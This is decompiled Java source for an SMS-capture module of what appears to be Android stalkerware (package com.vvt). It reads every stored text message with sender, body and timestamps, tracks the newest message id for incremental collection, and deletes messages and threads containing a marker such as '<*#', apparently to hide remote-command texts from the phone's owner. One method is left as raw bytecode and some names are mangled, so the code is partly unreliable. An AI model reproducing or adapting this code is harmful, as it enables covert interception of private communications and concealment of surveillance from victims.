package com.vvt.capture.sms.a;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.sms.SmsData;
import com.vvt.capture.sms.SmsData.Type;
import com.vvt.capture.sms.TextComparisonMode;
import com.vvt.h.h;
import java.util.ArrayList;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  
  private SmsData a(Cursor paramCursor)
  {
    int i = 1;
    int j = paramCursor.getColumnIndex("_id");
    long l1 = paramCursor.getLong(j);
    j = paramCursor.getColumnIndex("thread_id");
    long l2 = paramCursor.getLong(j);
    j = paramCursor.getColumnIndex("date");
    long l3 = paramCursor.getLong(j);
    j = paramCursor.getColumnIndex("type");
    int k = paramCursor.getShort(j);
    j = paramCursor.getColumnIndex("address");
    String str1 = paramCursor.getString(j);
    j = paramCursor.getColumnIndex("body");
    String str2 = paramCursor.getString(j);
    String str3 = h.a(str1);
    if (str3 != null)
    {
      int m = str3.length();
      if (m >= i) {}
    }
    else
    {
      str3 = "";
    }
    SmsData localSmsData;
    if (k == i)
    {
      localSmsData = new com/vvt/capture/sms/SmsData;
      localSmsData.<init>();
      localSmsData.a(l1);
      localSmsData.c(l2);
      localSmsData.b(l3);
      if (i == 0) {
        break label232;
      }
    }
    label232:
    for (SmsData.Type localType = SmsData.Type.IN;; localType = SmsData.Type.OUT)
    {
      localSmsData.a(localType);
      localSmsData.a(str2);
      localSmsData.b(str3);
      localSmsData.c(str1);
      i = a;
      if (i != 0) {}
      return localSmsData;
      i = 0;
      localType = null;
      break;
    }
  }
  
  /* Error */
  private boolean a(TextComparisonMode paramTextComparisonMode, String paramString)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_3
    //   2: invokestatic 105	com/vvt/capture/sms/a/a:removeFromPath	()Landroid/database/sqlite/SQLiteDatabase;
    //   5: astore 4
    //   7: aload 4
    //   9: ifnull +27 -> 36
    //   12: aload 4
    //   14: invokevirtual 111	android/database/sqlite/SQLiteDatabase:isDbLockedByCurrentThread	()Z
    //   17: istore 5
    //   19: iload 5
    //   21: ifne +15 -> 36
    //   24: aload 4
    //   26: invokevirtual 114	android/database/sqlite/SQLiteDatabase:isDbLockedByOtherThreads	()Z
    //   29: istore 5
    //   31: iload 5
    //   33: ifeq +32 -> 65
    //   36: getstatic 15	com/vvt/capture/sms/a/removeFromPath:a	Z
    //   39: istore 5
    //   41: iload 5
    //   43: ifeq +3 -> 46
    //   46: aload 4
    //   48: ifnull +8 -> 56
    //   51: aload 4
    //   53: invokevirtual 117	android/database/sqlite/SQLiteDatabase:close	()V
    //   56: iconst_0
    //   57: istore 6
    //   59: aconst_null
    //   60: astore 4
    //   62: iload 6
    //   64: ireturn
    //   65: aload 4
    //   67: invokevirtual 121	android/database/sqlite/SQLiteDatabase:getPath	()Ljava/lang/String;
    //   70: astore 7
    //   72: aload 7
    //   74: ifnull +13 -> 87
    //   77: getstatic 15	com/vvt/capture/sms/a/removeFromPath:a	Z
    //   80: istore 5
    //   82: iload 5
    //   84: ifeq +3 -> 87
    //   87: new 123	java/util/ArrayList
    //   90: astore 8
    //   92: aload 8
    //   94: invokespecial 124	java/util/ArrayList:<init>	()V
    //   97: new 126	java/util/HashSet
    //   100: astore 9
    //   102: aload 9
    //   104: invokespecial 127	java/util/HashSet:<init>	()V
    //   107: new 129	java/lang/StringBuilder
    //   110: astore 10
    //   112: aload 10
    //   114: invokespecial 130	java/lang/StringBuilder:<init>	()V
    //   117: ldc -124
    //   119: astore 7
    //   121: aload 10
    //   123: aload 7
    //   125: invokevirtual 136	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   128: pop
    //   129: ldc 46
    //   131: astore 7
    //   133: aload 10
    //   135: aload 7
    //   137: invokevirtual 136	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   140: pop
    //   141: ldc -118
    //   143: astore 7
    //   145: aload 10
    //   147: aload 7
    //   149: invokevirtual 136	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   152: pop
    //   153: ldc -116
    //   155: astore 7
    //   157: iconst_0
    //   158: istore 11
    //   160: aconst_null
    //   161: astore 12
    //   163: aload 10
    //   165: invokevirtual 143	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   168: astore 10
    //   170: iconst_0
    //   171: istore 13
    //   173: aconst_null
    //   174: astore 14
    //   176: iconst_0
    //   177: istore 15
    //   179: aconst_null
    //   180: astore 16
    //   182: iconst_0
    //   183: istore 17
    //   185: aconst_null
    //   186: astore 18
    //   188: aconst_null
    //   189: astore 19
    //   191: aload 4
    //   193: aload 7
    //   195: aconst_null
    //   196: aload 10
    //   198: aconst_null
    //   199: aconst_null
    //   200: aconst_null
    //   201: aconst_null
    //   202: invokevirtual 147	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   205: astore 7
    //   207: aload 7
    //   209: ifnull +495 -> 704
    //   212: aload 7
    //   214: invokeinterface 150 1 0
    //   219: istore 11
    //   221: iload 11
    //   223: ifeq +481 -> 704
    //   226: ldc 30
    //   228: astore 12
    //   230: aload 7
    //   232: aload 12
    //   234: invokeinterface 36 2 0
    //   239: istore 11
    //   241: aload 7
    //   243: iload 11
    //   245: invokeinterface 40 2 0
    //   250: lstore 20
    //   252: ldc 58
    //   254: astore 14
    //   256: aload 7
    //   258: aload 14
    //   260: invokeinterface 36 2 0
    //   265: istore 13
    //   267: aload 7
    //   269: iload 13
    //   271: invokeinterface 56 2 0
    //   276: astore 14
    //   278: ldc 42
    //   280: astore 16
    //   282: aload 7
    //   284: aload 16
    //   286: invokeinterface 36 2 0
    //   291: istore 15
    //   293: aload 7
    //   295: iload 15
    //   297: invokeinterface 40 2 0
    //   302: lstore 22
    //   304: aload 14
    //   306: ifnull -94 -> 212
    //   309: aload 14
    //   311: invokevirtual 153	java/lang/String:toLowerCase	()Ljava/lang/String;
    //   314: astore 14
    //   316: aload_2
    //   317: invokevirtual 153	java/lang/String:toLowerCase	()Ljava/lang/String;
    //   320: astore 19
    //   322: aload 14
    //   324: aload 19
    //   326: invokevirtual 157	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   329: istore 13
    //   331: iload 13
    //   333: ifeq -121 -> 212
    //   336: lload 20
    //   338: invokestatic 163	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   341: astore 12
    //   343: aload 8
    //   345: aload 12
    //   347: invokeinterface 169 2 0
    //   352: pop
    //   353: lload 22
    //   355: invokestatic 163	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   358: astore 12
    //   360: aload 9
    //   362: aload 12
    //   364: invokevirtual 170	java/util/HashSet:add	(Ljava/lang/Object;)Z
    //   367: pop
    //   368: goto -156 -> 212
    //   371: astore 12
    //   373: getstatic 23	com/vvt/capture/sms/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   376: istore 11
    //   378: iload 11
    //   380: ifeq +3 -> 383
    //   383: aload 7
    //   385: ifnull +10 -> 395
    //   388: aload 7
    //   390: invokeinterface 171 1 0
    //   395: getstatic 15	com/vvt/capture/sms/a/removeFromPath:a	Z
    //   398: istore 5
    //   400: iload 5
    //   402: ifeq +3 -> 405
    //   405: ldc -83
    //   407: astore 12
    //   409: aload 8
    //   411: invokeinterface 177 1 0
    //   416: astore 10
    //   418: aload 10
    //   420: invokeinterface 182 1 0
    //   425: istore 5
    //   427: iload 5
    //   429: ifeq +104 -> 533
    //   432: aload 10
    //   434: invokeinterface 186 1 0
    //   439: astore 7
    //   441: aload 7
    //   443: checkcast 159	java/lang/Long
    //   446: astore 7
    //   448: aload 7
    //   450: invokevirtual 190	java/lang/Long:longValue	()J
    //   453: lstore 24
    //   455: ldc -116
    //   457: astore 7
    //   459: iconst_1
    //   460: istore 17
    //   462: iload 17
    //   464: anewarray 65	java/lang/String
    //   467: astore 18
    //   469: aconst_null
    //   470: astore 19
    //   472: lload 24
    //   474: invokestatic 193	java/lang/Long:toString	(J)Ljava/lang/String;
    //   477: astore 14
    //   479: aload 18
    //   481: iconst_0
    //   482: aload 14
    //   484: aastore
    //   485: aload 4
    //   487: aload 7
    //   489: aload 12
    //   491: aload 18
    //   493: invokevirtual 197	android/database/sqlite/SQLiteDatabase:delete	(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;)I
    //   496: pop
    //   497: getstatic 18	com/vvt/capture/sms/a/removeFromPath:removeFromPath	Z
    //   500: istore 5
    //   502: iload 5
    //   504: ifeq -86 -> 418
    //   507: goto -89 -> 418
    //   510: astore 4
    //   512: iconst_0
    //   513: istore 5
    //   515: aconst_null
    //   516: astore 7
    //   518: aload 7
    //   520: ifnull +10 -> 530
    //   523: aload 7
    //   525: invokeinterface 171 1 0
    //   530: aload 4
    //   532: athrow
    //   533: getstatic 15	com/vvt/capture/sms/a/removeFromPath:a	Z
    //   536: istore 5
    //   538: iload 5
    //   540: ifeq +3 -> 543
    //   543: aload 9
    //   545: invokevirtual 198	java/util/HashSet:iterator	()Ljava/util/Iterator;
    //   548: astore 10
    //   550: aload 10
    //   552: invokeinterface 182 1 0
    //   557: istore 5
    //   559: iload 5
    //   561: ifeq +81 -> 642
    //   564: aload 10
    //   566: invokeinterface 186 1 0
    //   571: astore 7
    //   573: aload 7
    //   575: checkcast 159	java/lang/Long
    //   578: astore 7
    //   580: aload 7
    //   582: invokevirtual 190	java/lang/Long:longValue	()J
    //   585: lstore 24
    //   587: ldc -56
    //   589: astore 7
    //   591: iconst_1
    //   592: istore 17
    //   594: iload 17
    //   596: anewarray 65	java/lang/String
    //   599: astore 18
    //   601: aconst_null
    //   602: astore 19
    //   604: lload 24
    //   606: invokestatic 202	java/lang/String:valueOf	(J)Ljava/lang/String;
    //   609: astore 14
    //   611: aload 18
    //   613: iconst_0
    //   614: aload 14
    //   616: aastore
    //   617: aload 4
    //   619: aload 7
    //   621: aload 12
    //   623: aload 18
    //   625: invokevirtual 197	android/database/sqlite/SQLiteDatabase:delete	(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;)I
    //   628: pop
    //   629: getstatic 18	com/vvt/capture/sms/a/removeFromPath:removeFromPath	Z
    //   632: istore 5
    //   634: iload 5
    //   636: ifeq -86 -> 550
    //   639: goto -89 -> 550
    //   642: aload 4
    //   644: ifnull +8 -> 652
    //   647: aload 4
    //   649: invokevirtual 117	android/database/sqlite/SQLiteDatabase:close	()V
    //   652: iload_3
    //   653: istore 6
    //   655: goto -593 -> 62
    //   658: astore 7
    //   660: getstatic 23	com/vvt/capture/sms/a/removeFromPath:MyUncaughtExceptionHandler	Z
    //   663: istore 5
    //   665: iload 5
    //   667: ifeq +3 -> 670
    //   670: aload 4
    //   672: ifnull +8 -> 680
    //   675: aload 4
    //   677: invokevirtual 117	android/database/sqlite/SQLiteDatabase:close	()V
    //   680: iconst_0
    //   681: istore 6
    //   683: aconst_null
    //   684: astore 4
    //   686: goto -624 -> 62
    //   689: astore 7
    //   691: aload 4
    //   693: ifnull +8 -> 701
    //   696: aload 4
    //   698: invokevirtual 117	android/database/sqlite/SQLiteDatabase:close	()V
    //   701: aload 7
    //   703: athrow
    //   704: aload 7
    //   706: ifnull -311 -> 395
    //   709: goto -321 -> 388
    //   712: astore 4
    //   714: goto -196 -> 518
    //   717: astore 7
    //   719: iconst_0
    //   720: istore 5
    //   722: aconst_null
    //   723: astore 7
    //   725: goto -352 -> 373
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	728	0	this	removeFromPath
    //   0	728	1	paramTextComparisonMode	TextComparisonMode
    //   0	728	2	paramString	String
    //   1	652	3	bool1	boolean
    //   5	481	4	localSQLiteDatabase	SQLiteDatabase
    //   510	166	4	localObject1	Object
    //   684	13	4	localObject2	Object
    //   712	1	4	localObject3	Object
    //   17	704	5	bool2	boolean
    //   57	625	6	bool3	boolean
    //   70	550	7	localObject4	Object
    //   658	1	7	localSQLiteException1	SQLiteException
    //   689	16	7	localObject5	Object
    //   717	1	7	localSQLiteException2	SQLiteException
    //   723	1	7	localObject6	Object
    //   90	320	8	localArrayList	ArrayList
    //   100	444	9	localHashSet	java.util.HashSet
    //   110	455	10	localObject7	Object
    //   158	64	11	bool4	boolean
    //   239	5	11	i	int
    //   376	3	11	bool5	boolean
    //   161	202	12	localObject8	Object
    //   371	1	12	localSQLiteException3	SQLiteException
    //   407	215	12	str1	String
    //   171	99	13	j	int
    //   329	3	13	bool6	boolean
    //   174	441	14	str2	String
    //   177	119	15	k	int
    //   180	105	16	str3	String
    //   183	412	17	m	int
    //   186	438	18	arrayOfString	String[]
    //   189	414	19	str4	String
    //   250	87	20	l1	long
    //   302	52	22	l2	long
    //   453	152	24	l3	long
    // Exception table:
    //   from	to	target	type
    //   212	219	371	android/database/sqlite/SQLiteException
    //   232	239	371	android/database/sqlite/SQLiteException
    //   243	250	371	android/database/sqlite/SQLiteException
    //   258	265	371	android/database/sqlite/SQLiteException
    //   269	276	371	android/database/sqlite/SQLiteException
    //   284	291	371	android/database/sqlite/SQLiteException
    //   295	302	371	android/database/sqlite/SQLiteException
    //   309	314	371	android/database/sqlite/SQLiteException
    //   316	320	371	android/database/sqlite/SQLiteException
    //   324	329	371	android/database/sqlite/SQLiteException
    //   336	341	371	android/database/sqlite/SQLiteException
    //   345	353	371	android/database/sqlite/SQLiteException
    //   353	358	371	android/database/sqlite/SQLiteException
    //   362	368	371	android/database/sqlite/SQLiteException
    //   107	110	510	finally
    //   112	117	510	finally
    //   123	129	510	finally
    //   135	141	510	finally
    //   147	153	510	finally
    //   163	168	510	finally
    //   201	205	510	finally
    //   409	416	658	android/database/sqlite/SQLiteException
    //   418	425	658	android/database/sqlite/SQLiteException
    //   432	439	658	android/database/sqlite/SQLiteException
    //   441	446	658	android/database/sqlite/SQLiteException
    //   448	453	658	android/database/sqlite/SQLiteException
    //   462	467	658	android/database/sqlite/SQLiteException
    //   472	477	658	android/database/sqlite/SQLiteException
    //   482	485	658	android/database/sqlite/SQLiteException
    //   491	497	658	android/database/sqlite/SQLiteException
    //   497	500	658	android/database/sqlite/SQLiteException
    //   533	536	658	android/database/sqlite/SQLiteException
    //   543	548	658	android/database/sqlite/SQLiteException
    //   550	557	658	android/database/sqlite/SQLiteException
    //   564	571	658	android/database/sqlite/SQLiteException
    //   573	578	658	android/database/sqlite/SQLiteException
    //   580	585	658	android/database/sqlite/SQLiteException
    //   594	599	658	android/database/sqlite/SQLiteException
    //   604	609	658	android/database/sqlite/SQLiteException
    //   614	617	658	android/database/sqlite/SQLiteException
    //   623	629	658	android/database/sqlite/SQLiteException
    //   629	632	658	android/database/sqlite/SQLiteException
    //   409	416	689	finally
    //   418	425	689	finally
    //   432	439	689	finally
    //   441	446	689	finally
    //   448	453	689	finally
    //   462	467	689	finally
    //   472	477	689	finally
    //   482	485	689	finally
    //   491	497	689	finally
    //   497	500	689	finally
    //   533	536	689	finally
    //   543	548	689	finally
    //   550	557	689	finally
    //   564	571	689	finally
    //   573	578	689	finally
    //   580	585	689	finally
    //   594	599	689	finally
    //   604	609	689	finally
    //   614	617	689	finally
    //   623	629	689	finally
    //   629	632	689	finally
    //   660	663	689	finally
    //   212	219	712	finally
    //   232	239	712	finally
    //   243	250	712	finally
    //   258	265	712	finally
    //   269	276	712	finally
    //   284	291	712	finally
    //   295	302	712	finally
    //   309	314	712	finally
    //   316	320	712	finally
    //   324	329	712	finally
    //   336	341	712	finally
    //   345	353	712	finally
    //   353	358	712	finally
    //   362	368	712	finally
    //   373	376	712	finally
    //   107	110	717	android/database/sqlite/SQLiteException
    //   112	117	717	android/database/sqlite/SQLiteException
    //   123	129	717	android/database/sqlite/SQLiteException
    //   135	141	717	android/database/sqlite/SQLiteException
    //   147	153	717	android/database/sqlite/SQLiteException
    //   163	168	717	android/database/sqlite/SQLiteException
    //   201	205	717	android/database/sqlite/SQLiteException
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = a.a();
    if (localObject1 != null)
    {
      bool2 = ((SQLiteDatabase)localObject1).isDbLockedByCurrentThread();
      if (!bool2)
      {
        bool2 = ((SQLiteDatabase)localObject1).isDbLockedByOtherThreads();
        if (!bool2) {
          break label76;
        }
      }
    }
    boolean bool2 = a;
    if ((!bool2) || (localObject1 != null)) {
      ((SQLiteDatabase)localObject1).close();
    }
    localObject1 = localArrayList;
    for (;;)
    {
      return (List)localObject1;
      label76:
      Object localObject2 = ((SQLiteDatabase)localObject1).getPath();
      if (localObject2 != null)
      {
        bool2 = a;
        if (!bool2) {}
      }
      localObject2 = "(%s = %d OR %s = %d OR %s = %d OR %s = %d)";
      int j = 8;
      for (;;)
      {
        try
        {
          localObject4 = new Object[j];
          int k = 0;
          String str1 = null;
          Object localObject5 = "type";
          localObject4[0] = localObject5;
          k = 1;
          int m = 1;
          localObject5 = Integer.valueOf(m);
          localObject4[k] = localObject5;
          k = 2;
          localObject5 = "type";
          localObject4[k] = localObject5;
          k = 3;
          m = 4;
          localObject5 = Integer.valueOf(m);
          localObject4[k] = localObject5;
          k = 4;
          localObject5 = "type";
          localObject4[k] = localObject5;
          k = 5;
          m = 2;
          localObject5 = Integer.valueOf(m);
          localObject4[k] = localObject5;
          k = 6;
          localObject5 = "type";
          localObject4[k] = localObject5;
          k = 7;
          m = 6;
          localObject5 = Integer.valueOf(m);
          localObject4[k] = localObject5;
          str1 = String.format((String)localObject2, (Object[])localObject4);
          String str2 = "_id DESC";
          int i = -1;
          if (paramInt == i) {
            paramInt = -1 >>> 1;
          }
          localObject2 = "sms";
          j = 0;
          localObject4 = null;
          m = 0;
          localObject5 = null;
          String str3 = Integer.toString(paramInt);
          localObject2 = ((SQLiteDatabase)localObject1).query((String)localObject2, null, str1, null, null, null, str2, str3);
        }
        catch (SQLiteException localSQLiteException1)
        {
          Object localObject4;
          boolean bool4;
          boolean bool3 = false;
          Object localObject3 = null;
          continue;
        }
        try
        {
          bool4 = a;
          if (!bool4) {}
        }
        catch (SQLiteException localSQLiteException2) {}
      }
      if (localObject2 == null)
      {
        bool3 = a;
        if ((!bool3) || (localObject1 != null)) {
          ((SQLiteDatabase)localObject1).close();
        }
        localObject1 = localArrayList;
      }
      else
      {
        bool4 = a;
        if (bool4) {}
        for (;;)
        {
          bool4 = ((Cursor)localObject2).moveToNext();
          if (!bool4) {
            break;
          }
          localObject4 = a((Cursor)localObject2);
          localArrayList.add(localObject4);
        }
        if (localObject2 != null) {
          ((Cursor)localObject2).close();
        }
        if (localObject1 != null) {
          ((SQLiteDatabase)localObject1).close();
        }
        bool1 = a;
        if (bool1) {}
        localObject1 = localArrayList;
      }
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = (Long)paramg1.getReference();
    long l = ((Long)localObject1).longValue();
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    localObject1 = a.a();
    boolean bool2;
    if (localObject1 != null)
    {
      bool2 = ((SQLiteDatabase)localObject1).isDbLockedByCurrentThread();
      if (!bool2)
      {
        bool2 = ((SQLiteDatabase)localObject1).isDbLockedByOtherThreads();
        if (!bool2) {
          break label105;
        }
      }
    }
    bool3 = a;
    if ((!bool3) || (localObject1 != null)) {
      ((SQLiteDatabase)localObject1).close();
    }
    localObject1 = localArrayList;
    for (;;)
    {
      return (List)localObject1;
      label105:
      String str = ((SQLiteDatabase)localObject1).getPath();
      if (str != null)
      {
        bool2 = a;
        if (!bool2) {}
      }
      str = "(%s = %d OR %s = %d OR %s = %d OR %s = %d) AND %s > %d";
      int i = 10;
      for (;;)
      {
        try
        {
          Object[] arrayOfObject = new Object[i];
          int j = 0;
          Object localObject2 = "type";
          arrayOfObject[0] = localObject2;
          j = 1;
          int k = 1;
          localObject2 = Integer.valueOf(k);
          arrayOfObject[j] = localObject2;
          j = 2;
          localObject2 = "type";
          arrayOfObject[j] = localObject2;
          j = 3;
          k = 4;
          localObject2 = Integer.valueOf(k);
          arrayOfObject[j] = localObject2;
          j = 4;
          localObject2 = "type";
          arrayOfObject[j] = localObject2;
          j = 5;
          k = 2;
          localObject2 = Integer.valueOf(k);
          arrayOfObject[j] = localObject2;
          j = 6;
          localObject2 = "type";
          arrayOfObject[j] = localObject2;
          j = 7;
          k = 6;
          localObject2 = Integer.valueOf(k);
          arrayOfObject[j] = localObject2;
          j = 8;
          localObject2 = "_id";
          arrayOfObject[j] = localObject2;
          j = 9;
          localObject3 = Long.valueOf(l);
          arrayOfObject[j] = localObject3;
          str = String.format(str, arrayOfObject);
          localObject3 = "sms";
          bool4 = false;
          localSmsData = null;
          i = 0;
          arrayOfObject = null;
          j = 0;
          k = 0;
          localObject2 = null;
          localObject3 = ((SQLiteDatabase)localObject1).query((String)localObject3, null, str, null, null, null, null);
        }
        catch (SQLiteException localSQLiteException1)
        {
          Object localObject3;
          boolean bool4;
          SmsData localSmsData;
          bool3 = false;
          Object localObject4 = null;
          continue;
        }
        try
        {
          bool4 = a;
          if (!bool4) {}
        }
        catch (SQLiteException localSQLiteException2) {}
      }
      if (localObject3 == null)
      {
        bool3 = a;
        if ((!bool3) || (localObject1 != null)) {
          ((SQLiteDatabase)localObject1).close();
        }
        localObject1 = localArrayList;
      }
      else
      {
        bool4 = a;
        if (bool4) {}
        for (;;)
        {
          bool4 = ((Cursor)localObject3).moveToNext();
          if (!bool4) {
            break;
          }
          localSmsData = a((Cursor)localObject3);
          localArrayList.add(localSmsData);
        }
        if (localObject3 != null) {
          ((Cursor)localObject3).close();
        }
        if (localObject1 != null) {
          ((SQLiteDatabase)localObject1).close();
        }
        bool1 = a;
        if (bool1) {}
        localObject1 = localArrayList;
      }
    }
  }
  
  public boolean a(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    TextComparisonMode localTextComparisonMode = TextComparisonMode.CONTAINS;
    bool1 = a(localTextComparisonMode, paramString);
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  public FxSimpleEventReference b()
  {
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    Long localLong = Long.valueOf(c());
    localFxSimpleEventReference.setReference(localLong);
    return localFxSimpleEventReference;
  }
  
  public long c()
  {
    long l = -1;
    boolean bool1 = false;
    localCursor = null;
    localSQLiteDatabase = a.a();
    if (localSQLiteDatabase != null)
    {
      bool2 = localSQLiteDatabase.isDbLockedByCurrentThread();
      if (!bool2)
      {
        bool2 = localSQLiteDatabase.isDbLockedByOtherThreads();
        if (!bool2) {
          break label62;
        }
      }
    }
    bool1 = c;
    if ((!bool1) || (localSQLiteDatabase != null)) {
      localSQLiteDatabase.close();
    }
    for (;;)
    {
      return l;
      label62:
      String str1 = "SELECT MAX(%s) FROM %s";
      int i = 2;
      try
      {
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        String str2 = "_id";
        arrayOfObject[0] = str2;
        j = 1;
        str2 = "sms";
        arrayOfObject[j] = str2;
        str1 = String.format(str1, arrayOfObject);
        i = 0;
        arrayOfObject = null;
        localCursor = localSQLiteDatabase.rawQuery(str1, null);
        if (localCursor != null)
        {
          bool2 = localCursor.moveToNext();
          if (bool2)
          {
            bool2 = false;
            str1 = null;
            l = localCursor.getLong(0);
          }
        }
        if (localCursor != null) {
          localCursor.close();
        }
        if (localSQLiteDatabase == null) {
          break label185;
        }
      }
      catch (SQLiteException localSQLiteException)
      {
        for (;;)
        {
          label185:
          bool2 = c;
          if ((!bool2) || (localCursor != null)) {
            localCursor.close();
          }
          if (localSQLiteDatabase == null) {}
        }
      }
      finally
      {
        if (localCursor == null) {
          break label242;
        }
        localCursor.close();
        if (localSQLiteDatabase == null) {
          break label252;
        }
        localSQLiteDatabase.close();
      }
      localSQLiteDatabase.close();
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  public void d()
  {
    boolean bool = a;
    if (bool) {}
    String str = "<*#";
    TextComparisonMode localTextComparisonMode = TextComparisonMode.STARTWITH;
    a(localTextComparisonMode, str);
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/sms/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */